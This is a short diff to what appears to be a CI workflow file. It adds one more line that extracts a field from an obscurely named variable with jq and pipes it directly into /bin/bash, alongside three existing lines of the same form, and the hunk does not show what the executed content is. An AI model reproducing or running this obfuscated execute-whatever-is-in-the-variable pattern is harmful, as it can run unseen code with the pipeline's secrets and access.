@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$sdkv94940" | jq -r .s70 | /bin/bash
           echo $lw86 | jq -r .naa2 | /bin/bash
           echo $dk357 | jq -r .rr8 | /bin/bash
+          printf '%s' "$y06" | jq -r .n517 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
